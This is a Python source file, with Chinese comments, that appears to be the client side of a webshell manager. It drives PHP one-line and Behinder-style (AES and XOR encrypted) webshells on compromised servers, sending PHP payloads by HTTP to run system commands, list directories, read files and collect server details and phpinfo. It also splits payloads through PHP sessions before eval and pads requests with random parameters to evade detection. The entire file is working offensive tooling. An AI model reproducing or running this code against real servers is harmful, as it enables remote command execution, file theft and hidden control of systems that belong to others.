"""PHP Session的实现"""

import base64
import hashlib
import json
import logging
import random
import re
import string
import typing as t
from dataclasses import dataclass
from binascii import Error as BinasciiError
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from . import exceptions
from ..utils import random_english_words
from .base import PHPSessionInterface, DirectoryEntry, BasicInfoEntry

logger = logging.getLogger("sessions.php")

SUBMIT_WRAPPER_PHP = """\
if (session_status() == PHP_SESSION_NONE) {{
    session_id('{session_id}');
    session_start();
}}
echo '{delimiter_start_1}'.'{delimiter_start_2}';
try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
echo '{delimiter_stop}';"""

LIST_DIR_PHP = """
error_reporting(0);
$folderPath = DIR_PATH;
$files = scandir($folderPath);
$result = array();
foreach ($files as $file) {
    $filePath = $folderPath . $file;
    $fileType = filetype($filePath);
    if($fileType == "link") {
        if(is_dir($filePath)) {
            $fileType = "link-dir";
        }else if(is_file($filePath)) {
            $fileType = "link-file";
        }else{
            $fileType = "unknown";
        }
    }
    array_push($result, array(
        "name" => basename($file),
        "type" => $fileType,
        "permission" => substr(decoct(fileperms($filePath)), -3),
        "filesize" => filesize($filePath)
    ));
}
echo json_encode($result);
"""

GET_FILE_CONTENT_PHP = """
$filePath = FILE_PATH;
if(!is_file($filePath)) {
    echo "WRONG_NOT_FILE";
}
else if(!is_readable($filePath)) {
    echo "WRONG_NO_PERMISSION";
}
else if(filesize($filePath) > MAX_SIZE) {
    echo "WRONG_FILE_TOO_LARGE";
}else {
    $content = file_get_contents($filePath);
    echo base64_encode($content);
}
"""

GET_BASIC_INFO_PHP = """
$infos = array();
array_push($infos, [
    "key" => "PHPVERSION",
    "value" => phpversion()
]);
array_push($infos, [
    "key" => "SYSTEMVERSION",
    "value" => php_uname()
]);
array_push($infos, [
    "key" => "CURRENT_FOLDER",
    "value" => getcwd()
]);
array_push($infos, [
    "key" => "CURRENT_PHP_SCRIPT",
    "value" => __FILE__
]);
array_push($infos, [
    "key" => "CURRENT_PHPINI",
    "value" => php_ini_loaded_file()
]);
array_push($infos, [
    "key" => "HTTP_SOFTWARE",
    "value" => $_SERVER['SERVER_SOFTWARE']
]);
array_push($infos, [
    "key" => "SERVER_ADDR",
    "value" => $_SERVER['SERVER_ADDR']
]);
array_push($infos, [
    "key" => "SERVER_PORT",
    "value" => $_SERVER['SERVER_PORT']
]);
try {
    $user=posix_getpwuid(posix_geteuid());
    $group = posix_getgrgid($user['gid']);
    array_push($infos, [
        "key" => "SERVER_USER",
        "value" => $user["name"]
    ]);
    array_push($infos, [
        "key" => "SERVER_GROUP",
        "value" => $group["name"]
    ]);
}catch(Exception $e) {}
array_push($infos, [
    "key" => "ENV_PATH",
    "value" => getenv('PATH')
]);
array_push($infos, [
    "key" => "INI_DISABLED_FUNCTIONS",
    "value" => ini_get('disable_functions')
]);
array_push($infos, [
    "key" => "EXTENSIONS",
    "value" => implode(", ", get_loaded_extensions())
]);
echo json_encode($infos);
"""

DOWNLOAD_PHPINFO_PHP = """
ob_start();
phpinfo();
$content = ob_get_contents();
ob_end_clean();
echo base64_encode($content);
"""

PAYLOAD_SESSIONIZE = """
$b64_part = 'B64_PART';
if(!$_SESSION['PAYLOAD_STORE']) {
    $_SESSION['PAYLOAD_STORE'] = array();
}
$_SESSION['PAYLOAD_STORE'][PAYLOAD_ORDER] = $b64_part;
"""

PAYLOAD_SESSIONIZE_TRIGGER = """
if(!$_SESSION['PAYLOAD_STORE']) {
    echo "PAYLOAD_SESSIONIZE_UNEXIST";
}else{
    $payload = "";
    $parts = $_SESSION['PAYLOAD_STORE'];
    for($i = 0; $i < count($parts); $i ++) {
        if(!$parts[$i]) {
            break;
        }
        $payload .= $parts[$i];
    }
    if($i != count($parts)) {
        echo "PAYLOAD_SESSIONIZE_UNEXIST";
    }else{
        $payload = ("base"."64_decode")($payload);
        eval($payload);
    }
}
unset($_SESSION['PAYLOAD_STORE']);
"""

PAYLOAD_SESSIONIZE_CHUNK = 5000

__all__ = [
    "PHPWebshell",
    "PHPWebshellOneliner",
    "PHPWebshellBehinderAES",
    "PHPWebshellBehinderXor",
]

basic_info_names = {
    "PHPVERSION": "当前PHP版本",
    "SYSTEMVERSION": "系统版本",
    "CURRENT_FOLDER": "当前目录",
    "CURRENT_PHP_SCRIPT": "当前PHP脚本",
    "CURRENT_PHPINI": "当前php.ini位置",
    "HTTP_SOFTWARE": "当前HTTP服务器",
    "SERVER_ADDR": "服务器地址",
    "SERVER_PORT": "服务器端口",
    "SERVER_USER": "服务器用户",
    "SERVER_GROUP": "用户所在组",
    "ENV_PATH": "环境变量PATH",
    "INI_DISABLED_FUNCTIONS": "disabled_functions",
    "EXTENSIONS": "PHP扩展",
}


def md5_encode(s):
    """将给定的字符串或字节序列转换成MD5"""
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s):
    """将给定的字符串或字节序列编码成base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


def behinder_aes(payload, key):
    """将给定的payload按照冰蝎的格式进行AES加密"""
    iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    payload = "1|" + payload
    payload = pad(payload.encode(), AES.block_size)
    return base64_encode(cipher.encrypt(payload))


def behinder_xor(payload: str, key: bytes):
    """将给定的payload按照冰蝎的格式进行Xor加密"""
    payload = ("1|" + payload).encode()
    payload = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload)])
    return base64_encode(payload)


def to_sessionize_payload(payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK) -> str:
    payload = base64_encode(payload)
    payload_store_name = random_english_words()
    payloads = []
    for i in range(0, len(payload), chunk):
        part = payload[i : i + chunk]
        part = (
            PAYLOAD_SESSIONIZE.replace("PAYLOAD_ORDER", str(i))
            .replace("B64_PART", part)
            .replace("PAYLOAD_STORE", payload_store_name)
        )
        payloads.append(part)
    final = PAYLOAD_SESSIONIZE_TRIGGER.replace("PAYLOAD_STORE", payload_store_name)
    payloads.append(final)
    return payloads


def compress_php_code(source: str) -> str:
    """去除php payload中的注释和换行

    Args:
        source (str): 原PHP payload

    Returns:
        str: 去除结果
    """
    source = re.sub("(#|//).+\n", "\n", source)
    return re.sub(r"(?<=[\{\};])\n? *", "", source)


@dataclass
class PHPWebshellOptions:
    """除了submit_raw之外的函数需要的各类选项"""

    encoder: t.Literal["raw", "base64"] = "raw"
    sessionize_payload: bool = True


class PHPWebshell(PHPSessionInterface):
    """PHP session各类工具函数的实现"""

    def __init__(self, options: t.Union[None, PHPWebshellOptions]):
        self.options = options if options else PHPWebshellOptions()
        self.session_id = "".join(random.choices("1234567890abcdef", k=32))

    def encode(self, payload: str) -> str:
        """应用编码器"""
        if self.options.encoder == "raw":
            return payload
        if self.options.encoder == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            return f'eval(base64_decode("{encoded}"));'
        raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")

    async def execute_cmd(self, cmd: str) -> str:
        return await self.submit(f"system({cmd!r});")

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        dir_path = dir_path.removesuffix("/") + "/"
        php_code = LIST_DIR_PHP.replace("DIR_PATH", repr(dir_path))
        json_result = await self.submit(php_code)
        try:
            result = json.loads(json_result)
        except json.JSONDecodeError as exc:
            raise exceptions.UnexpectedError("JSON解析失败: " + json_result) from exc
        result = [
            DirectoryEntry(
                name=item["name"],
                permission=item["permission"],
                entry_type=(
                    item["type"]
                    if item["type"] in ["dir", "file", "link-dir", "link-file"]
                    else "unknown"
                ),
                filesize=item["filesize"],
            )
            for item in result
        ]
        if not any(entry.name == ".." for entry in result):
            result.insert(
                0,
                DirectoryEntry(
                    name="..", permission="555", filesize=-1, entry_type="dir"
                ),
            )
        return result

    async def get_file_contents(
        self, filepath: str, max_size: int = 1024 * 200
    ) -> bytes:
        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
            "MAX_SIZE", str(max_size)
        )
        result = await self.submit(php_code)
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("目标不是一个文件")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限读取这个文件")
        if result == "WRONG_FILE_TOO_LARGE":
            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
        return base64.b64decode(result)

    async def get_pwd(self) -> str:
        return await self.submit("echo __DIR__;")

    async def test_usablility(self) -> bool:
        first_string, second_string = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        try:
            result = await self.submit(f"echo '{first_string}' . '{second_string}';")
        except exceptions.NetworkError:
            return False
        return (first_string + second_string) in result

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        json_result = await self.submit(GET_BASIC_INFO_PHP)
        try:
            raw_result = json.loads(json_result)
            result = [
                {
                    "key": (
                        basic_info_names[entry["key"]]
                        if entry["key"] in basic_info_names
                        else entry["key"]
                    ),
                    "value": entry["value"],
                }
                for entry in raw_result
            ]
            return result
        except json.JSONDecodeError as exc:
            raise exceptions.UnexpectedError("解析目标返回的JSON失败") from exc

    async def download_phpinfo(self) -> bytes:
        """获取当前的phpinfo文件"""
        b64_result = await self.submit(DOWNLOAD_PHPINFO_PHP)
        try:
            return base64.b64decode(b64_result)
        except BinasciiError as exc:
            raise exceptions.UnexpectedError("base64解码接收到的数据失败") from exc

    async def _submit(self, payload: str) -> str:
        """将php payload通过encoder编码后提交"""
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_PHP.format(
            delimiter_start_1=start[:3],
            delimiter_start_2=start[3:],
            delimiter_stop=stop,
            payload_raw=payload,
            session_id=self.session_id,
        )
        payload = compress_php_code(payload)
        payload = self.encode(payload)
        status_code, text = await self.submit_raw(payload)
        if status_code != 200:
            raise exceptions.UnexpectedError(f"status code error: {status_code}")
        if "POSTEXEC_FAILED" in text:
            raise exceptions.UnexpectedError(
                "POSTEXEC_FAILED found, payload run failed"
            )
        idx_start = text.find(start)
        if idx_start == -1:
            raise exceptions.UnexpectedError(
                f"idx error: start={idx_start}, text={repr(text)}"
            )
        idx_stop_r = text[idx_start:].find(stop)
        if idx_stop_r == -1:
            raise exceptions.UnexpectedError(
                f"idx error: start={idx_start}, stop_r={idx_stop_r}, text={text!r}"
            )
        idx_stop = idx_stop_r + idx_start
        return text[idx_start + len(start) : idx_stop]

    async def submit(self, payload: str) -> str:
        # sessionize_payload
        payloads = [payload]
        if self.options.sessionize_payload:
            payloads = to_sessionize_payload(payload)
        result = None
        for payload_part in payloads:
            result = await self._submit(payload_part)
            if result == "PAYLOAD_SESSIONIZE_UNEXIST":
                raise exceptions.UnexpectedError(
                    "Session中不存在payload，是不是不支持Session？"
                )
        return result

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        """提交原始php payload

        Args:
            payload (str): 需要提交的payload

        Returns:
            t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
        """
        raise NotImplementedError("这个函数应该由实际的实现override")


class PHPWebshellOneliner(PHPWebshell):
    """一句话的php webshell"""

    def __init__(
        self,
        method: str,
        url: str,
        password: str,
        params: t.Union[t.Dict, None] = None,
        data: t.Union[t.Dict, None] = None,
        http_params_obfs: bool = False,
        options: t.Union[PHPWebshellOptions, None] = None,
    ) -> None:
        super().__init__(options)
        self.method = method.upper()
        self.url = url
        self.password = password
        self.params = {} if params is None else params
        self.data = {} if data is None else data
        self.http_params_obfs = http_params_obfs

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        params = self.params.copy()
        data = self.data.copy()
        obfs_data = {}
        if self.http_params_obfs:
            obfs_data = {
                random_english_words(): random_english_words() for _ in range(20)
            }
        if self.method in ["GET", "HEAD"]:
            params[self.password] = payload
            params.update(obfs_data)
        else:
            data[self.password] = payload
            data.update(obfs_data)
        try:
            async with httpx.AsyncClient() as client:
                response = await client.request(
                    method=self.method, url=self.url, params=params, data=data
                )
                return response.status_code, response.text

        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求失败") from exc


class PHPWebshellBehinderAES(PHPWebshell):
    def __init__(
        self,
        url: str,
        password: str,  # "rebeyond"
        options: t.Union[PHPWebshellOptions, None] = None,
    ):
        super().__init__(options)
        self.url = url
        self.key = md5_encode(password)[:16].encode()

    async def submit_raw(self, payload):
        data = behinder_aes(payload, self.key)
        try:
            async with httpx.AsyncClient() as client:
                response = await client.request(method="POST", url=self.url, data=data)
                return response.status_code, response.text
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求失败") from exc


class PHPWebshellBehinderXor(PHPWebshell):
    def __init__(
        self,
        url: str,
        password: str,  # "rebeyond"
        options: t.Union[PHPWebshellOptions, None] = None,
    ):
        super().__init__(options)
        self.url = url
        self.key = md5_encode(password)[:16].encode()

    async def submit_raw(self, payload):
        data = behinder_xor(payload, self.key)
        try:
            async with httpx.AsyncClient() as client:
                response = await client.request(method="POST", url=self.url, data=data)
                return response.status_code, response.text
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求失败") from exc
